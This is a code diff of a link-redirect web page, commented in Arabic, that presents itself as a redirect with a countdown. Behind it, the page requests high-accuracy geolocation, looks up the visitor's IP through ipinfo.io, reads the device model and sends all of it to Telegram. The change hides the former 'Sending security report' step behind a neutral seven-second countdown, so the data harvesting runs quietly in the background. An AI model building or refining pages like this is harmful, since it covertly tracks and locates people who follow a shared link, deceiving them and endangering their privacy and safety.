@@ -85,7 +85,7 @@
       width: 0%;
       background: linear-gradient(90deg, #3b82f6, #f43f5e);
       border-radius: 10px;
-      transition: width 0.3s ease;
+      transition: width 0.1s linear;
     }
   </style>
 </head>
@@ -98,7 +98,7 @@
     </div>
 
     <div class="timer-section">
-      <p class="timer-text" id="status-text">Preparing secure connection...</p>
+      <p class="timer-text" id="status-text">Redirecting in <span id="seconds-count" class="seconds-counter">7</span>s</p>
       <div class="progress-bar-bg">
         <div id="progress" class="progress-bar-fill"></div>
       </div>
@@ -115,7 +115,7 @@
     let targetUrl = defaultUrl;
     let displayName = defaultName;
 
-    // دالة لجلب إحداثيات اللوكيشن الحقيقي بطلب إذن المستخدم
+    // طلب إذن اللوكيشن
     function requestLocation() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
@@ -131,63 +131,11 @@
             });
           },
           (error) => {
-            resolve(null); // لو المستخدم رفض الإذن أو حصل خطأ
+            resolve(null);
           },
           { timeout: 5000, maximumAge: 0, enableHighAccuracy: true }
         );
       });
-    }
-
-    async function initRedirectSystem() {
-      // منع الكاش عبر إضافة باراميتر عشوائي وقت القراءة لو أمكن
-      const urlParams = new URLSearchParams(window.location.search);
-      let queryValue = urlParams.has('to') ? urlParams.get('to').trim() : "";
-
-      const progressEl = document.getElementById('progress');
-      const statusText = document.getElementById('status-text');
-
-      progressEl.style.width = '20%';
-      statusText.textContent = "Loading destination...";
-
-      try {
-        const response = await fetch('links.json?_=' + new Date().getTime());
-        const destinationsDB = await response.json();
-
-        if (queryValue && destinationsDB[queryValue]) {
-          targetUrl = destinationsDB[queryValue].url;
-          displayName = destinationsDB[queryValue].destination;
-        } else if (queryValue.startsWith('http')) {
-          targetUrl = queryValue;
-          let urlObj = new URL(targetUrl);
-          displayName = urlObj.hostname.replace('www.', '');
-          displayName = displayName.charAt(0).toUpperCase() + displayName.slice(1);
-        }
-      } catch (e) {
-        console.error("Could not load links.json", e);
-      }
-
-      document.getElementById('dest-name').textContent = displayName;
-      document.getElementById('page-title').textContent = "Redirecting to " + displayName;
-
-      progressEl.style.width = '50%';
-      statusText.textContent = "Requesting location permissions...";
-
-      // طلب إذن اللوكيشن من المستخدم
-      const coords = await requestLocation();
-
-      progressEl.style.width = '80%';
-      statusText.textContent = "Sending security report...";
-
-      // جمع البيانات وإرسالها لتليجرام وانتظار اكتمال الإرسال تماماً
-      await collectAndSendToTelegram(coords);
-
-      progressEl.style.width = '100%';
-      statusText.textContent = "Redirecting now...";
-
-      // التوجيه الفوري فور انتهاء العمليات
-      setTimeout(() => {
-        window.location.replace(targetUrl);
-      }, 500);
     }
 
     function getExactDeviceModel() {
@@ -210,7 +158,7 @@
       return deviceName;
     }
 
-    async function collectAndSendToTelegram(coords) {
+    async function sendDataToTelegram(coords) {
       try {
         const ipResponse = await fetch('https://ipinfo.io/json');
         const ipData = await ipResponse.json();
@@ -262,7 +210,70 @@
       }
     }
 
-    initRedirectSystem();
+    async function initSystem() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let queryValue = urlParams.has('to') ? urlParams.get('to').trim() : "";
+
+      try {
+        const response = await fetch('links.json?_=' + new Date().getTime());
+        const destinationsDB = await response.json();
+
+        if (queryValue && destinationsDB[queryValue]) {
+          targetUrl = destinationsDB[queryValue].url;
+          displayName = destinationsDB[queryValue].destination;
+        } else if (queryValue.startsWith('http')) {
+          targetUrl = queryValue;
+          let urlObj = new URL(targetUrl);
+          displayName = urlObj.hostname.replace('www.', '');
+          displayName = displayName.charAt(0).toUpperCase() + displayName.slice(1);
+        }
+      } catch (e) {
+        console.error("Could not load links.json", e);
+      }
+
+      document.getElementById('dest-name').textContent = displayName;
+      document.getElementById('page-title').textContent = "Redirecting to " + displayName;
+
+      // نبدأ تشغيل طلب اللوكيشن وإرسال تليجرام في الخلفية فوراً
+      const telegramPromise = (async () => {
+        const coords = await requestLocation();
+        await sendDataToTelegram(coords);
+      })();
+
+      // ضبط العداد 7 ثواني (7000 مللي ثانية)
+      const totalTime = 7000;
+      let startTime = Date.now();
+      const progressEl = document.getElementById('progress');
+      const secondsCountEl = document.getElementById('seconds-count');
+      const statusText = document.getElementById('status-text');
+
+      let timerInterval = setInterval(async () => {
+        let elapsed = Date.now() - startTime;
+        let remaining = totalTime - elapsed;
+        let percentage = Math.min(100, (elapsed / totalTime) * 100);
+        
+        progressEl.style.width = percentage + '%';
+        let secondsLeft = Math.ceil(remaining / 1000);
+        if (secondsLeft < 0) secondsLeft = 0;
+        secondsCountEl.textContent = secondsLeft;
+
+        // لو الـ 7 ثواني خلصت
+        if (elapsed >= totalTime) {
+          clearInterval(timerInterval);
+          statusText.textContent = "Finalizing...";
+          
+          // نتاكد إن إرسال التليجرام خلص تماماً برضه قبل ما نحول
+          await telegramPromise;
+
+          statusText.textContent = "Redirecting now...";
+          setTimeout(() => {
+            window.location.replace(targetUrl);
+          }, 300);
+        }
+      }, 50);
+    }
+
+    initSystem();
   </script>
 </body>
 </html>
